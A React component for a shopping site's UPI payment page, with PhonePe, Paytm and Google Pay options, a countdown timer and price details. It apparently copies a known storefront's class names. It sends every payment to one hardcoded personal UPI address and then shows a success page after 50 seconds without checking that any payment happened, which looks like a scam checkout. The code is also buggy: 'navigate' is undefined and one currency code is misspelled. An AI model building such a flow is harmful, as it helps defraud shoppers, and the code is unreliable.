import React, { useState } from 'react'
import pay from "../assets/lastpayment.svg"
import paytm from "../assets/paytm-1.svg"
import phonepay from "../assets/ppay.png"
import upi1 from "../assets/bhim_upi-(1).svg"
import upi from "../assets/upi.png"
import gpay from "../assets/google-pay-icon.webp"
import { useLocation } from 'react-router-dom'
import img from "../assets/80.jpg"
import Timer2 from './Timer2'
import { Link } from 'react-router-dom';

const Paymwnt = () => {
  const { state } = useLocation();
  const [activeMethod, setActiveMethod] = useState('phonepe'); // Default active method
  
  const handleMethodClick = (method) => {
    setActiveMethod(method);
  };
  const payNow = (upi_address) => {
    const amt = state.from; // Retrieve the amount from state
    // upi://pay?pa=${upiId}&am=${amount}&cu=INR
    let redirect_url = "";
    const payType = activeMethod;
    switch (payType) {
      case 'phonepe':
        upi://pay?pa=UPIID@oksbi&amp;pn=FNAME SNAME K&amp;cu=INR
        redirect_url = `upi://pay?pa=${upi_address}&am=${amt}&cu=INR`;
        break;
      case 'upi':
        redirect_url = `upi://pay?pa=${upi_address}&am=${amt}&cu=INR`; // updated redirect URL for BHIM UPI
        break;
        case 'gpay':
        redirect_url = `upi://pay?pa=${upi_address}&am=${amt}&cu=INR`;
        break;
      case 'paytm':
        redirect_url = `upi://pay?pa=${upi_address}&am=${amt}&cu=INRR`; // updated redirect URL for BHIM UPI
        break;
      default:
        break;
    }
    console.log(redirect_url)
    window.location.href = redirect_url;
    
  // Set a timeout to navigate to the success page after 50 seconds
  setTimeout(() => {
    navigate('/details/product/payment/pay/paymentuccess');
  }, 50000); // 50000 milliseconds = 50 seconds
};

  const PaymentMethod = ({ imageSrc, altText, method }) => {
    return (
      <div
        className={`form-check available-method ${activeMethod === method ? 'active active-border' : ''}`}
        pay-type={method}
        onClick={() => handleMethodClick(method)}
      >
         <label className="form-check-label flex w-full px-11 items-center h-14 gap-8 border border-gray-400 rounded-md cursor-pointer">
          <img src={imageSrc} className="pay-logo p-1 w-14 h-7" alt={altText} />
          <span className="unaviablee">{altText}</span>
        </label>
      </div>
    );
  };
  return (
    <>
      <div className='w-screen font-bold flex items-center justify-center text-xl '>Payments</div>
      <hr />
      <div className='w-screen'><img className='w-screen' src={pay} alt="" /></div>
      <div className='w-screen h-2 bg-gray-300'></div>
      <div className="py-2 px-3">
        <Timer2 />

        <div style={{ display: 'flex', alignItems: 'center', gap: '15px', fontSize: '10px', fontWeight: 300, letterSpacing: '-0.02px', lineHeight: '28px' }}>
          <span>PAY ONLINE (PhonePe/Paytm/Scan)</span>
          <div className='bg-yellow-400' style={{ height: '1px', flexGrow: 1 }}></div>
        </div>

        <br />

        <PaymentMethod imageSrc={phonepay} altText="PhonePe" method="phonepe" />
        <br />
        <PaymentMethod imageSrc={paytm} altText="Paytm" method="paytm" />
        <br />
        <PaymentMethod imageSrc={gpay} altText="Google Pay" method="gpay" />
        <br />
        <PaymentMethod imageSrc={upi} altText="Other UPI APP" method="upi" />
        <br />

        
      </div>

      <div className="_1pxkiG _1eutih">
        <div className="_1VXdNp p-3 flex flex-col gap-2">
          <table className="_331pj4">
            <tbody>
              <tr>
                <td className="_3IZyFp mx-4" data-highlight-class="_1osddA" id="price-summary-heading">PRICE DETAILS</td>
              </tr>
            </tbody>
          </table>

          {/* Price Details */}
          <div className="_2vTGX1">
            <div className="_z61fB">
              <div className="_1s60nC justify-between flex p-4">
                <div className="font-inter text-base font-light text-gray-600">Price (1 item)</div>
                <div className="_38ubMW">
                  <div className="font-inter font-semibold text-base text-gray-600">₹{state.from}</div>
                </div>
              </div>
            </div>
          </div>

          {/* Delivery Charges */}
          <div className="_2vTGX1">
            <div className="_z61fB">
              <div className="_1s60nC flex justify-between p-4">
                <div className="font-inter font-semibold text-base  text-gray-600">Delivery Charges</div>
                <div className="_38ubMW">
                  <div className="font-inter font-semibold text-base text-green-500">Free Delivery</div>
                </div>
              </div>
            </div>
          </div>

          {/* Amount Payable */}
          <div className="_3wcG1h p-4">
            <div className="_z61fB">
              <div className="_1s60nC _2t8HQf flex justify-between ">
                <div className="font-inter font-semibold text-base  text-gray-600">Amount Payable</div>
                <div className="font-inter font-semibold text-base text-green-500">₹{state.from}</div>
              </div>
            </div>
            <br />
            {/* <button className="bg-yellow-400 h-10 rounded-lg w-full text-black border-none">
              <Link to={"/details/product/payment/pay/paymentuccess"} className='font-light'>
                ₹{state.from} Pay
              </Link>
            </button> */}
            <button
          className="bg-yellow-400 h-10 rounded-lg w-full text-black border-none"
          onClick={() => payNow('fcbiznfouzi@freecharge')}
        >
          Pay ₹{state.from}
        </button>
          </div>
          <br />
        </div>
      </div>
      <div className='w-screen'>
        <img src={img} alt="" />
      </div>
    </>
  );
};

//export default Payment;

export default Paymwnt